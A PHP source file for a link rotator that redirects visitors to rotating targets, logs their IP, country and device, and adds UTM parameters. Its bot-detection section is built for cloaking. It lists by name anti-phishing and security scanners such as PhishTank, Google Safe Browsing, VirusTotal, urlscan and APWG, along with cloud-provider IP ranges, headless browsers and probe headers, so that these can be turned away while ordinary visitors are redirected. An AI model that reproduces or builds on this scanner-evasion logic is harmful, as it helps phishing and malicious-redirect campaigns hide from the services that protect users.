<?php
// Enhanced Link Rotator System with improved security and functionality

/**
 * Load links from JSON file
 * @return array Array of links
 */
function load_links(): array {
    $filePath = '../data/links.json';
    if (!file_exists($filePath)) {
        file_put_contents($filePath, json_encode([]));
        return [];
    }
    
    $content = file_get_contents($filePath);
    if ($content === false) {
        throw new RuntimeException("Failed to read links file");
    }
    
    return json_decode($content, true) ?? [];
}

/**
 * Save links to JSON file
 * @param array $links Links array to save
 */
function save_links(array $links): void {
    $filePath = '../data/links.json';
    $result = file_put_contents($filePath, json_encode($links, JSON_PRETTY_PRINT));
    if ($result === false) {
        throw new RuntimeException("Failed to save links file");
    }
}

/**
 * Load logs from JSON file
 * @return array Array of logs
 */
function load_logs(): array {
    $filePath = '../data/logs.json';
    if (!file_exists($filePath)) {
        file_put_contents($filePath, json_encode([]));
        return [];
    }
    
    $content = file_get_contents($filePath);
    if ($content === false) {
        throw new RuntimeException("Failed to read logs file");
    }
    
    return json_decode($content, true) ?? [];
}

/**
 * Save logs to JSON file
 * @param array $logs Logs array to save
 */
function save_logs(array $logs): void {
    $filePath = '../data/logs.json';
    $result = file_put_contents($filePath, json_encode($logs, JSON_PRETTY_PRINT));
    if ($result === false) {
        throw new RuntimeException("Failed to save logs file");
    }
}

/**
 * Generate a random hash
 * @return string Random 16-character hex string
 */
function generate_hash(): string {
    return bin2hex(random_bytes(8));
}

/**
 * Get link by hash
 * @param string $hash Link hash
 * @return array|null Link array or null if not found
 */
function get_link_by_hash(string $hash): ?array {
    $links = load_links();
    foreach ($links as $link) {
        if ($link['hash'] === $hash) {
            return $link;
        }
    }
    return null;
}

/**
 * Rotate link based on rotation method
 * @param array $link Link array
 * @return string|null Target URL or null if no targets
 */
function rotate_link(array $link): ?string {
    if (empty($link['targets'])) {
        return null;
    }
    
    $targets = $link['targets'];
    $method = $link['rotation_method'] ?? 'random';
    
    if ($method === 'round-robin') {
        $lastIndex = $link['last_index'] ?? 0;
        $nextIndex = ($lastIndex + 1) % count($targets);
        
        // Update last_index in the original array
        $links = load_links();
        foreach ($links as &$l) {
            if ($l['hash'] === $link['hash']) {
                $l['last_index'] = $nextIndex;
                break;
            }
        }
        save_links($links);
        
        return $targets[$nextIndex];
    }
    
    // Default to random
    return $targets[array_rand($targets)];
}

/**
 * Log a visit with detailed information
 * @param string $hash Link hash
 * @param bool $is_bot Whether visitor is a bot
 */
function log_visit(string $hash, bool $is_bot = false): void {
    $logs = load_logs();
    
    $log_entry = [
        'hash' => $hash,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'referer' => $_SERVER['HTTP_REFERER'] ?? '',
        'is_bot' => $is_bot,
        'country' => get_country_from_ip($_SERVER['REMOTE_ADDR'] ?? ''),
        'device' => get_device_type(),
        'timestamp' => time(),
        'date' => date('Y-m-d H:i:s'),
        'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? '',
        'request_method' => $_SERVER['REQUEST_METHOD'] ?? ''
    ];
    
    $logs[] = $log_entry;
    save_logs($logs);
}

/**
 * Get country from IP address
 * @param string $ip IP address
 * @return string Country name
 */
function get_country_from_ip(string $ip): string {
    if ($ip === '127.0.0.1' || $ip === '::1') return 'Localhost';
    
    // Cache implementation
    static $ipCache = [];
    if (isset($ipCache[$ip])) {
        return $ipCache[$ip];
    }
    
    $url = "http://ip-api.com/json/{$ip}?fields=status,country";
    $context = stream_context_create(['http' => ['timeout' => 2]]);
    $response = @file_get_contents($url, false, $context);
    
    if ($response) {
        $data = json_decode($response, true);
        if ($data['status'] === 'success') {
            $ipCache[$ip] = $data['country'] ?? 'Unknown';
            return $ipCache[$ip];
        }
    }
    
    return 'Unknown';
}

/**
 * Get device type from user agent
 * @return string 'Mobile' or 'Desktop'
 */
function get_device_type(): string {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    $mobileKeywords = [
        'Mobile', 'Android', 'iPhone', 'iPad', 'iPod',
        'BlackBerry', 'Opera Mini', 'IEMobile', 'WPDesktop'
    ];
    
    foreach ($mobileKeywords as $keyword) {
        if (stripos($user_agent, $keyword) !== false) {
            return 'Mobile';
        }
    }
    
    return 'Desktop';
}

/**
 * Check if visitor is a bot
 * @return bool True if bot detected
 */
function is_bot(): bool {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $request_headers = getallheaders() ?: [];

    // 1. Known security bots
    $security_bots = [
        'securityscan', 'trustwave', 'qualysguard', 'rapid7', 'tenable',
        'sucuri', 'imperva', 'cloudflare-security', 'akamai-bot',
        'f5-security', 'barracuda', 'fortinet', 'paloalto', 'symantec',
        'phishtank', 'google-safebrowsing', 'microsoft-defender',
        'apwg-ecrime', 'stopbadbot', 'phishfort', 'cert-bot',
        'sophos-web-filter', 'malwarebytes', 'kaspersky',
        'ai-security-scan', 'deepguard', 'neural-protect',
        'quantum-sec', 'zero-trust-verifier', 'sentinelbot',
        'abuseipdb', 'virustotal', 'urlscan', 'threatcrowd',
        'alienvault', 'talosintel', 'fireeye',
        'scrapy', 'selenium', 'headlesschrome', 'phantomjs',
        'nightmarejs', 'puppeteer', 'playwright'
    ];

    foreach ($security_bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            log_bot_attempt($ip, "Security bot detected by UA: " . $bot);
            return true;
        }
    }

    // 2. Suspicious headers
    $suspiciousHeaders = [
        'x-security-scan' => null,
        'x-phishing-verify' => null,
        'x-malware-detection' => null,
        'x-threat-intel' => null,
        'via' => fn($val) => str_contains(strtolower($val), 'security-gateway'),
        'x-puppeteer' => null,
        'x-headless' => null
    ];

    foreach ($suspiciousHeaders as $header => $validator) {
        if (isset($request_headers[$header])) {
            if ($validator === null || $validator($request_headers[$header])) {
                log_bot_attempt($ip, "Suspicious header detected: " . $header);
                return true;
            }
        }
    }

    // 3. Known threat IP ranges
    $threat_intel_ips = [
        '173.245.48.0/20', '103.21.244.0/22', '141.101.64.0/18',
        '64.233.160.0/19', '66.102.0.0/20', '72.14.192.0/18',
        '13.64.0.0/16', '40.74.0.0/15', '52.184.0.0/17',
        '185.143.16.0/24', '45.133.182.0/24', '91.243.118.0/24'
    ];

    foreach ($threat_intel_ips as $cidr) {
        if (ip_in_range($ip, $cidr)) {
            log_bot_attempt($ip, "Threat intel IP range: " . $cidr);
            return true;
        }
    }

    // 4. Suspicious behavior
    if (detect_suspicious_behavior()) {
        log_bot_attempt($ip, "Suspicious behavior detected");
        return true;
    }

    // 5. Headless browser detection
    if (detect_headless_browser($user_agent, $request_headers)) {
        log_bot_attempt($ip, "Headless browser detected");
        return true;
    }

    return false;
}

/**
 * Check if IP is in CIDR range
 * @param string $ip IP address
 * @param string $cidr CIDR notation
 * @return bool True if IP is in range
 */
function ip_in_range(string $ip, string $cidr): bool {
    if ($ip === 'unknown') return false;
    
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    
    if ($ip_long === false || $subnet_long === false) {
        return false;
    }
    
    $mask_long = ~((1 << (32 - $mask)) - 1);
    return ($ip_long & $mask_long) == ($subnet_long & $mask_long);
}

/**
 * Detect suspicious behavior
 * @return bool True if suspicious behavior detected
 */
function detect_suspicious_behavior(): bool {
    // 1. Rate limiting
    $request_rate = calculate_request_rate();
    if ($request_rate > 15) {
        return true;
    }

    // 2. Suspicious paths
    $request_path = $_SERVER['REQUEST_URI'] ?? '';
    $suspicious_paths = [
        '/wp-admin', '/phpmyadmin', '/.env', '/.git',
        '/admin', '/backup', '/config', '/sql',
        '/db', '/database', '/setup', '/install'
    ];
    
    foreach ($suspicious_paths as $path) {
        if (stripos($request_path, $path) !== false) {
            return true;
        }
    }

    // 3. Missing common headers
    $requiredHeaders = ['HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_ACCEPT_ENCODING'];
    foreach ($requiredHeaders as $header) {
        if (!isset($_SERVER[$header])) {
            return true;
        }
    }

    // 4. Unusual request methods
    $method = $_SERVER['REQUEST_METHOD'] ?? '';
    if (!in_array($method, ['GET', 'POST', 'HEAD'])) {
        return true;
    }

    return false;
}

/**
 * Calculate request rate
 * @return float Requests per second
 */
function calculate_request_rate(): float {
    static $requestTimes = [];
    $now = microtime(true);
    
    // Keep only requests from last 5 seconds
    $requestTimes = array_filter($requestTimes, fn($time) => $time > $now - 5);
    $requestTimes[] = $now;
    
    return count($requestTimes) / 5;
}

/**
 * Detect headless browser
 * @param string $user_agent User agent string
 * @param array $headers Request headers
 * @return bool True if headless browser detected
 */
function detect_headless_browser(string $user_agent, array $headers): bool {
    $headless_indicators = [
        'headlesschrome', 'phantomjs', 'electron',
        'navigator.plugins.length==0',
        'google inc', 'intel inc', 'microsoft'
    ];

    foreach ($headless_indicators as $indicator) {
        if (stripos($user_agent, $indicator) !== false) {
            return true;
        }
    }

    // Check for headless browser headers
    $headlessHeaders = ['X-Headless', 'X-Puppeteer'];
    foreach ($headlessHeaders as $header) {
        if (isset($headers[$header])) {
            return true;
        }
    }

    // Check for generic Accept header
    if (isset($headers['Accept']) && $headers['Accept'] === '*/*') {
        return true;
    }

    return false;
}

/**
 * Log bot attempt
 * @param string $ip IP address
 * @param string $reason Detection reason
 */
function log_bot_attempt(string $ip, string $reason): void {
    $log_entry = sprintf(
        "[%s] Bot detected - IP: %s | Reason: %s | UA: %s | URL: %s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $reason,
        $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        $_SERVER['REQUEST_URI'] ?? 'Unknown'
    );
    
    $logPath = __DIR__.'/../data/bot_logs.log';
    if (file_put_contents($logPath, $log_entry, FILE_APPEND) === false) {
        error_log("Failed to write to bot log file: " . $logPath);
    }
}

/**
 * Add UTM parameters to URL
 * @param string $url Original URL
 * @param array $params UTM parameters
 * @return string URL with UTM parameters
 */
function add_utm_parameters(string $url, array $params): string {
    if (empty($params)) return $url;
    
    $parsed = parse_url($url);
    if ($parsed === false) {
        return $url;
    }
    
    $query = [];
    if (isset($parsed['query'])) {
        parse_str($parsed['query'], $query);
    }
    
    $query = array_merge($query, $params);
    
    $scheme = $parsed['scheme'] ?? 'https';
    $host = $parsed['host'] ?? '';
    $path = $parsed['path'] ?? '';
    
    $new_url = $scheme . '://' . $host . $path;
    
    if (!empty($query)) {
        $new_url .= '?' . http_build_query($query);
    }
    
    if (isset($parsed['fragment'])) {
        $new_url .= '#' . $parsed['fragment'];
    }
    
    return $new_url;
}
